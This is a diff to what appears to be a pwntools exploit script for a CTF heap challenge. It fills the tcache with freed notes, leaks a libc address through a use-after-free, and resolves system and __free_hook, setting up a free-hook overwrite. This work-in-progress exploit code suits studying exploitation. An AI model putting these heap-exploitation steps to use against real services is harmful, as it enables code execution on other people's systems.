@@ -46,13 +46,24 @@ for i in range(9):
     add_note(i,0x80)
 for i in range(8):
     delete_note(i)
+
 edit_note(7,b'a')
 show_note(7)
-main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) - 0x61 
-print(f'main_arena_addr = {hex(main_arena_addr)}')
+r.recv(6)
+libc_addr = u64(r.recv(6).ljust(8,b'\x00')) - 0x61 - 0x1d9a00 - 0x7000
+print(f'libc_addr  = {hex(libc_addr )}')
+libc.address = libc_addr 
+system_addr = libc.sym['system']
+free_hook = libc.sym['__free_hook']
+print(f'free_hook = {hex(free_hook)}')
+print(f'system_addr = {hex(system_addr)}')
 gdb.attach(r)
 pause()
+
 # r.sendlineafter()
 # r.send()
 # r.recvuntil()
 r.interactive()
+
+
+
